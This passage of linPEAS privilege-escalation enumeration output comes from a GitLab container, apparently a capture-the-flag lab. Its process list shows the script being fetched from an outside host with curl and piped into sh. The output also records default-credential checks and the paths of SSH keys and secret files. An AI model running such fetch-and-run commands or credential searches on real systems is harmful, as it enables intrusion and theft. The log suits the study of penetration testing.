/opt/gitlab/embedded/bin/curl
/usr/bin/base64
/opt/gitlab/embedded/bin/python3
/usr/bin/perl
/opt/gitlab/embedded/bin/ruby

[+] Installed Compiler


══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root           1  0.0  0.0  18044  2916 ?        Ss   17:59   0:00 /bin/bash /assets/wrapper
root          12  0.0  0.0   4388  1132 ?        S    17:59   0:00 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................
root          19  0.0  0.0   4236   636 ?        Ss   17:59   0:00  _ runsv sshd
root          20  0.0  0.0   4380   672 ?        S    17:59   0:00  |   _ svlogd -tt /var/log/gitlab/sshd
root          21  0.0  0.1  65504  5532 ?        S    17:59   0:00  |   _ /usr/sbin/sshd -D -f /assets/sshd_config -e
root         469  0.0  0.0   4236   648 ?        Ss   18:00   0:00  _ runsv nginx
root         483  0.0  0.0   4380   652 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/nginx
root         485  0.0  0.1  42808  5820 ?        Ss   18:00   0:00  |   _ nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx
gitlab-+     514  0.0  0.1  47060  7908 ?        S    18:00   0:00  |       _ nginx: worker process
gitlab-+     515  0.0  0.1  47060  7908 ?        S    18:00   0:00  |       _ nginx: worker process
gitlab-+     516  0.0  0.1  47060  7908 ?        S    18:00   0:00  |       _ nginx: worker process
gitlab-+     517  0.0  0.1  47060  7984 ?        S    18:00   0:00  |       _ nginx: worker process
gitlab-+     518  0.0  0.0  42808  3208 ?        S    18:00   0:00  |       _ nginx: cache manager process
root         470  0.0  0.0   4236   648 ?        Ss   18:00   0:00  _ runsv gitaly
root         500  0.0  0.0   4380   664 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/gitaly
git          510  0.2  0.5 854624 23548 ?        Ssl  18:00   0:04  |   _ /opt/gitlab/embedded/bin/gitaly /var/opt/gitlab/gitaly/config.toml
git          612  0.6  1.6 2361588 65172 ?       Sl   18:00   0:11  |       _ ruby /opt/gitlab/embedded/service/gitaly-ruby/bin/gitaly-ruby 510 /tmp/gitaly-ruby017110446/socket.0
git          620  0.6  1.6 2371860 65412 ?       Sl   18:00   0:12  |       _ ruby /opt/gitlab/embedded/service/gitaly-ruby/bin/gitaly-ruby 510 /tmp/gitaly-ruby017110446/socket.1
root         471  0.0  0.0   4236   796 ?        Ss   18:00   0:00  _ runsv redis
root         489  0.0  0.0   4380   660 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/redis
gitlab-+     497  0.5  0.1  41644  6444 ?        Ssl  18:00   0:09  |   _ /opt/gitlab/embedded/bin/redis-server 127.0.0.1:6379
root         472  0.0  0.0   4236   644 ?        Ss   18:00   0:00  _ runsv redis-exporter
root         484  0.0  0.0   4380   672 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/redis-exporter
gitlab-+     488  0.0  0.2 290840 11748 ?        Ssl  18:00   0:00  |   _ /opt/gitlab/embedded/bin/redis_exporter --web.listen-address=localhost:9121 --redis.addr=unix:///var/opt/gitlab/redis/redis.socket
root         473  0.0  0.0   4236   648 ?        Ss   18:00   0:00  _ runsv postgres-exporter
root         492  0.0  0.0   4380   708 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/postgres-exporter
gitlab-+     503  0.0  0.3 234948 14548 ?        Ssl  18:00   0:01  |   _ /opt/gitlab/embedded/bin/postgres_exporter --web.listen-address=localhost:9187 --extend.query-path=/var/opt/gitlab/postgres-exporter/queries.yaml
root         474  0.0  0.0   4236   692 ?        Ss   18:00   0:00  _ runsv gitlab-workhorse
root         491  0.0  0.0   4380   656 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/gitlab-workhorse
git          502  0.0  0.4 350592 19288 ?        Ssl  18:00   0:01  |   _ /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -prometheusListenAddr localhost:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -config config.toml
root         475  0.0  0.0   4236   796 ?        Ss   18:00   0:00  _ runsv sidekiq
root         496  0.0  0.0   4380   648 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/sidekiq
git         3993  0.0  0.0  29940  3712 ?        S    18:26   0:00  |       _ bash
git         4659  0.0  0.1  31976  5280 ?        S    18:31   0:00  |       |   _ curl 10.10.14.21/linpeas.sh
git         4660  0.5  0.0  18320  3184 ?        S    18:31   0:00  |       |   _ sh
git         5365  0.0  0.0  18320   972 ?        S    18:31   0:00  |       |       _ sh
git         5369  0.0  0.0  45808  3764 ?        R    18:31   0:00  |       |       |   _ ps fauxwww
git         5368  0.0  0.0  18320   972 ?        S    18:31   0:00  |       |       _ sh
root         476  0.0  0.0   4236   636 ?        Ss   18:00   0:00  _ runsv node-exporter
root         501  0.0  0.0   4380   664 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/node-exporter
gitlab-+     508  0.0  0.3  20108 16064 ?        Ssl  18:00   0:01  |   _ /opt/gitlab/embedded/bin/node_exporter --web.listen-address=localhost:9100 --collector.textfile.directory=/var/opt/gitlab/node-exporter/textfile_collector
root         477  0.0  0.0   4236   664 ?        Ss   18:00   0:00  _ runsv postgresql
root         498  0.0  0.0   4380   756 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/postgresql
gitlab-+     509  0.0  0.4  50080 17940 ?        Ss   18:00   0:00  |   _ /opt/gitlab/embedded/bin/postgres -D /var/opt/gitlab/postgresql/data
gitlab-+     595  0.0  0.1  50184  6104 ?        Ss   18:00   0:00  |       _ postgres: checkpointer process   
gitlab-+     596  0.0  0.1  50080  5792 ?        Ss   18:00   0:00  |       _ postgres: writer process   
gitlab-+     597  0.0  0.0  50080  3956 ?        Ss   18:00   0:00  |       _ postgres: wal writer process   
gitlab-+     598  0.0  0.1  50632  6708 ?        Ss   18:00   0:00  |       _ postgres: autovacuum launcher process   
gitlab-+     599  0.0  0.1  33000  4796 ?        Ss   18:00   0:00  |       _ postgres: stats collector process   
root         478  0.0  0.0   4236   664 ?        Ss   18:00   0:00  _ runsv alertmanager
root         490  0.0  0.0   4380   708 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/alertmanager
gitlab-+     499  0.0  0.3 414500 12788 ?        Ssl  18:00   0:01  |   _ /opt/gitlab/embedded/bin/alertmanager --web.listen-address=localhost:9093 --storage.path=/var/opt/gitlab/alertmanager/data --config.file=/var/opt/gitlab/alertmanager/alertmanager.yml
root         479  0.0  0.0   4236   800 ?        Ss   18:00   0:00  _ runsv prometheus
root         486  0.0  0.0   4380   804 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/prometheus
gitlab-+     487 20.5  1.8 740936 75552 ?        Ssl  18:00   6:24  |   _ /opt/gitlab/embedded/bin/prometheus --web.listen-address=localhost:9090 --storage.tsdb.path=/var/opt/gitlab/prometheus/data --config.file=/var/opt/gitlab/prometheus/prometheus.yml
root         480  0.0  0.0   4236   696 ?        Ss   18:00   0:00  _ runsv logrotate
root         494  0.0  0.0   4380   672 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/logrotate
root         506  0.0  0.0   4500   704 ?        Ss   18:00   0:00  |   _ /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper
root        1826  0.0  0.0   4372   644 ?        S    18:10   0:00  |       _ sleep 3000
root         481  0.0  0.0   4236   800 ?        Ss   18:00   0:00  _ runsv unicorn
root         493  0.0  0.0   4380   664 ?        S    18:00   0:00  |   _ svlogd -tt /var/log/gitlab/unicorn
git          504  0.0  0.0  18164  3136 ?        Ss   18:00   0:00  |   _ /bin/bash /opt/gitlab/embedded/bin/gitlab-unicorn-wrapper
git         5149  0.0  0.0   4372   668 ?        S    18:31   0:00  |       _ sleep 1
root         482  0.0  0.0   4236   652 ?        Ss   18:00   0:00  _ runsv gitlab-monitor
root         495  0.0  0.0   4380   684 ?        S    18:00   0:00      _ svlogd -tt /var/log/gitlab/gitlab-monitor
git          505  0.8  0.8 444896 35012 ?        Ssl  18:00   0:15      _ /opt/gitlab/embedded/bin/ruby /opt/gitlab/embedded/bin/gitlab-mon web -c /var/opt/gitlab/gitlab-monitor/gitlab-monitor.yml
root         466  0.0  0.0  18028  2776 ?        S    18:00   0:00 /bin/bash /opt/gitlab/bin/gitlab-ctl tail
root         467  0.2  0.6  96892 25116 ?        Sl   18:00   0:04  _ /opt/gitlab/embedded/bin/ruby /opt/gitlab/embedded/bin/omnibus-ctl gitlab /opt/gitlab/embedded/service/omnibus-ctl* tail
root         605  0.0  0.0   4500   704 ?        S    18:00   0:00      _ sh -c find -L /var/log/gitlab -type f -not -path '*/sasl/*' | grep -E -v '(config|lock|@|gzip|tgz|gz)' | xargs tail --follow=name --retry
root         608  0.0  0.0   4672  1228 ?        S    18:00   0:00          _ xargs tail --follow=name --retry
root         609  0.0  0.0   4404   688 ?        S    18:00   0:00              _ tail --follow=name --retry /var/log/gitlab/nginx/current /var/log/gitlab/nginx/error.log /var/log/gitlab/nginx/gitlab_error.log /var/log/gitlab/nginx/gitlab_access.log /var/log/gitlab/nginx/access.log /var/log/gitlab/gitaly/current /var/log/gitlab/gitaly/state /var/log/gitlab/redis/current /var/log/gitlab/redis/state /var/log/gitlab/redis-exporter/current /var/log/gitlab/redis-exporter/state /var/log/gitlab/postgres-exporter/current /var/log/gitlab/postgres-exporter/state /var/log/gitlab/gitlab-shell/gitlab-shell.log /var/log/gitlab/gitlab-workhorse/current /var/log/gitlab/gitlab-workhorse/state /var/log/gitlab/sidekiq/current /var/log/gitlab/sidekiq/state /var/log/gitlab/node-exporter/current /var/log/gitlab/node-exporter/state /var/log/gitlab/postgresql/current /var/log/gitlab/postgresql/state /var/log/gitlab/gitlab-rails/application.log /var/log/gitlab/gitlab-rails/grpc.log /var/log/gitlab/gitlab-rails/sidekiq_exporter.log /var/log/gitlab/gitlab-rails/gitlab-rails-db-migrate-2020-07-08-08-52-42.log /var/log/gitlab/gitlab-rails/api_json.log /var/log/gitlab/gitlab-rails/production_json.log /var/log/gitlab/gitlab-rails/sidekiq.log /var/log/gitlab/gitlab-rails/production.log /var/log/gitlab/gitlab-rails/gitlab-rails-db-migrate-2020-12-04-14-12-34.log /var/log/gitlab/alertmanager/current /var/log/gitlab/alertmanager/state /var/log/gitlab/prometheus/current /var/log/gitlab/prometheus/state /var/log/gitlab/sshd/current /var/log/gitlab/logrotate/current /var/log/gitlab/logrotate/state /var/log/gitlab/unicorn/current /var/log/gitlab/unicorn/state /var/log/gitlab/unicorn/unicorn_stdout.log /var/log/gitlab/unicorn/unicorn_stderr.log /var/log/gitlab/gitlab-monitor/current /var/log/gitlab/gitlab-monitor/state
git          626  6.9 10.0 709248 406652 ?       Sl   18:00   2:10 unicorn master -D -E production -c /var/opt/gitlab/gitlab-rails/etc/unicorn.rb /opt/gitlab/embedded/service/gitlab-rails/config.ru

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
-rwxr-xr-x 1 root root  1037528 May 16  2017 /bin/bash
lrwxrwxrwx 1 root root        4 Feb 17  2016 /bin/sh -> dash
-rwxr-xr-x 1 root root 21391491 Nov 20  2018 /opt/gitlab/embedded/bin/alertmanager
-rwxr-xr-x 1 root root 21770527 Nov 20  2018 /opt/gitlab/embedded/bin/gitaly
-rwxr-xr-x 1 root root 21516818 Nov 20  2018 /opt/gitlab/embedded/bin/gitlab-workhorse
-rwxr-xr-x 1 root root 16201838 Nov 20  2018 /opt/gitlab/embedded/bin/node_exporter
lrwxrwxrwx 1 root root       50 Nov 20  2018 /opt/gitlab/embedded/bin/postgres -> /opt/gitlab/embedded/postgresql/9.6.8/bin/postgres
-rwxr-xr-x 1 root root 13352121 Nov 20  2018 /opt/gitlab/embedded/bin/postgres_exporter
lrwxrwxrwx 1 root root       36 Dec  1 12:42 /opt/gitlab/embedded/bin/prometheus -> /opt/gitlab/embedded/bin/prometheus2
-rwxr-xr-x 1 root root  5229608 Nov 20  2018 /opt/gitlab/embedded/bin/redis-server
-rwxr-xr-x 1 root root 10737741 Nov 20  2018 /opt/gitlab/embedded/bin/redis_exporter
-rwxr-xr-x 1 root root    12336 Nov 20  2018 /opt/gitlab/embedded/bin/ruby
-rwxr-xr-x 1 root root   791024 Nov  5  2018 /usr/sbin/sshd

[+] Files opened by processes belonging to other users
[i] This is usually empty because of the lack of privileges to read other user processes information

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
crontab Not Found
incrontab Not Found
/etc/cron.daily:
total 24
drwxr-xr-x 2 root root 4096 Nov 13  2018 .
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
-rwxr-xr-x 1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x 1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x 1 root root  249 Nov 12  2015 passwd

/etc/cron.weekly:
total 16
drwxr-xr-x 2 root root 4096 Nov 13  2018 .
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
-rwxr-xr-x 1 root root   86 Apr 13  2016 fstrim

[+] Services
[i] Search for outdated versions
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ - ]  hostname.sh
 [ - ]  killprocs
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ - ]  procps
 [ - ]  rc.local
 [ - ]  sendsigs
 [ - ]  ssh
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ - ]  urandom

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/lib/systemd/system/emergency.service is executing some relative path
/lib/systemd/system/rescue.service is executing some relative path
You can't write on systemd PATH

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
busctl Not Found


═══════════════════════════════════╣ Network Information ╠════════════════════════════════════
[+] Hostname, hosts and DNS
gitlab.example.com
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.19.0.2	gitlab.example.com gitlab
nameserver 127.0.0.11
options ndots:0
example.com

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0

[+] Networks and neighbours
Iface	Destination	Gateway 	Flags	RefCnt	Use	Metric	Mask		MTU	Window	IRTT                                                       
eth0	00000000	010013AC	0003	0	0	0	00000000	00	0                                                                               
eth0	000013AC	00000000	0001	0	0	0	0000FFFF	00	0                                                                               
IP address       HW type     Flags       HW address            Mask     Device
172.19.0.1       0x1         0x2         02:42:04:8b:0a:29     *        eth0

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports

[+] Can I sniff with tcpdump?
No


════════════════════════════════════╣ Users Information ╠════════════════════════════════════
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=998(git) gid=998(git) groups=998(git)

[+] Do I have PGP keys?
/opt/gitlab/embedded/bin/gpg
netpgpkeys Not Found
netpgp Not Found

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid

[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
gdb wasn't found in PATH

[+] Checking doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
dude:x:1000:1000::/home/dude:/bin/bash
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(dude) gid=1000(dude) groups=1000(dude)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=991(gitlab-consul) gid=991(gitlab-consul) groups=991(gitlab-consul)
uid=992(gitlab-prometheus) gid=992(gitlab-prometheus) groups=992(gitlab-prometheus)
uid=993(registry) gid=993(registry) groups=993(registry)
uid=994(mattermost) gid=994(mattermost) groups=994(mattermost)
uid=996(gitlab-psql) gid=996(gitlab-psql) groups=996(gitlab-psql)
uid=997(gitlab-redis) gid=997(gitlab-redis) groups=997(gitlab-redis)
uid=998(git) gid=998(git) groups=998(git)
uid=999(gitlab-www) gid=999(gitlab-www) groups=999(gitlab-www)

[+] Login now
 18:31:26 up 32 min,  0 users,  load average: 0.25, 0.11, 0.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons

wtmp begins Tue Jun 30 12:04:29 2020

[+] Last time logon each user
Username         Port     From             Latest

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!


═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════
[+] MySQL version
mysql Not Found

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
 Not Found

[+] PostgreSQL version and pgadmin credentials
Version: psql (PostgreSQL) 9.6.8

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
 Not Found

[+] Searching PHPCookies
 Not Found

[+] Searching Wordpress wp-config.php files
wp-config.php Not Found

[+] Searching Drupal settings.php files
/default/settings.php Not Found

[+] Searching Moodle config.php files
config.php inside a moodle folder Not Found

[+] Searching Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
mongo binary Not Found

[+] Searching supervisord configuration file
supervisord.conf Not Found

[+] Searching cesi configuration file
cesi.conf Not Found

[+] Searching Rsyncd config file
rsyncd.conf Not Found

[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/net-ldap-0.16.0/lib/net/ldap
/opt/gitlab/embedded/service/gitlab-rails/app/controllers/ldap
/opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/auth/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
/var/opt/gitlab/.ssh/authorized_keys
/var/opt/gitlab/.ssh/authorized_keys
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/cookbooks/openldap/files/default/.ssh/id_rsa
/opt/gitlab/embedded/service/gitlab-shell/bin/authorized_keys
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/var/opt/gitlab/gitlab-rails/etc/secrets.yml
  --> Some certificates were found (out limited):
/opt/gitlab/embedded/lib/ruby/2.4.0/rubygems/ssl_certs/index.rubygems.org/GlobalSignRootCA.pem
/opt/gitlab/embedded/lib/ruby/2.4.0/rubygems/ssl_certs/rubygems.global.ssl.fastly.net/DigiCertHighAssuranceEVRootCA.pem
/opt/gitlab/embedded/lib/ruby/2.4.0/rubygems/ssl_certs/rubygems.org/AddTrustExternalCARoot.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/attr_encrypted-3.1.0/certs/saghaulor.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bundler-1.16.2/lib/bundler/ssl_certs/index.rubygems.org/GlobalSignRootCA.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bundler-1.16.2/lib/bundler/ssl_certs/rubygems.global.ssl.fastly.net/DigiCertHighAssuranceEVRootCA.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/bundler-1.16.2/lib/bundler/ssl_certs/rubygems.org/AddTrustExternalCARoot.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/ssl/key.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/ssl/private_key.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/ssl/private_key_with_whitespace.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/trusted_certs/example.crt
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/trusted_certs/example_no_cn.crt
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/trusted_certs/intermediate.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/trusted_certs/opscode.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/trusted_certs/root.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-zero-13.1.0/spec/support/stickywicket.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/devise-two-factor-3.0.0/certs/tinfoil-cacert.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/devise-two-factor-3.0.0/certs/tinfoilsecurity-gems-cert.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/encryptor-3.0.0/certs/saghaulor.pem
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/eventmachine-1.0.9.1/tests/client.crt
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/json-jwt-1.9.4/spec/fixtures/rsa/private_key.der
  --> Some client certificates were found:
/opt/gitlab/embedded/lib/ruby/gems/2.4.0/gems/chef-13.6.4/spec/data/dsc_lcm.pfx
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
kadmin was found on /opt/gitlab/embedded/bin/kadmin
klist execution
-rw-r--r-- 1 root root 369 Nov 20  2018 /opt/gitlab/embedded/share/examples/krb5/krb5.conf
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
screen Not Found

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf
Found readable /var/opt/gitlab/redis/redis.conf
bind 127.0.0.1
port 6379
tcp-backlog 511
unixsocketperm 777
timeout 60
tcp-keepalive 300
daemonize no
pidfile "/var/run/redis_6379.pid"
loglevel notice
logfile ""
databases 16
save 900 1
save 300 10
save 60 10000
stop-writes-on-bgsave-error yes
rdbcompression yes
rdbchecksum yes
dbfilename "dump.rdb"
dir "/var/opt/gitlab/redis"
slave-serve-stale-data yes
slave-read-only yes
repl-disable-tcp-nodelay no
slave-priority 100
maxclients 10000
maxmemory 0
maxmemory-policy noeviction
maxmemory-samples 5
appendonly no
appendfsync everysec
no-appendfsync-on-rewrite no
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb
lua-time-limit 5000
slowlog-log-slower-than 10000
slowlog-max-len 128
notify-keyspace-events ""
hash-max-ziplist-entries 512
hash-max-ziplist-value 64
set-max-intset-entries 512
zset-max-ziplist-entries 128
zset-max-ziplist-value 64
activerehashing yes
client-output-buffer-limit normal 0 0 0
client-output-buffer-limit slave 256mb 64mb 60
client-output-buffer-limit pubsub 32mb 8mb 60
hz 10
aof-rewrite-incremental-fsync yes
Found readable /var/opt/gitlab/redis/redis.conf
bind 127.0.0.1
port 6379
tcp-backlog 511
unixsocketperm 777
timeout 60
tcp-keepalive 300
daemonize no
pidfile "/var/run/redis_6379.pid"
loglevel notice
logfile ""
databases 16
save 900 1
save 300 10
save 60 10000
stop-writes-on-bgsave-error yes
rdbcompression yes
rdbchecksum yes
dbfilename "dump.rdb"
dir "/var/opt/gitlab/redis"
slave-serve-stale-data yes
slave-read-only yes
repl-disable-tcp-nodelay no
slave-priority 100
maxclients 10000
maxmemory 0
maxmemory-policy noeviction
maxmemory-samples 5
appendonly no
appendfsync everysec
no-appendfsync-on-rewrite no
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb
lua-time-limit 5000
slowlog-log-slower-than 10000
slowlog-max-len 128
notify-keyspace-events ""
hash-max-ziplist-entries 512
hash-max-ziplist-value 64
set-max-intset-entries 512
zset-max-ziplist-entries 128
zset-max-ziplist-value 64
activerehashing yes
client-output-buffer-limit normal 0 0 0
client-output-buffer-limit slave 256mb 64mb 60
client-output-buffer-limit pubsub 32mb 8mb 60
hz 10
aof-rewrite-incremental-fsync yes

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files

[+] Searching IRSSI files

[+] Searching Keyring files
Keyring folder: /usr/share/keyrings
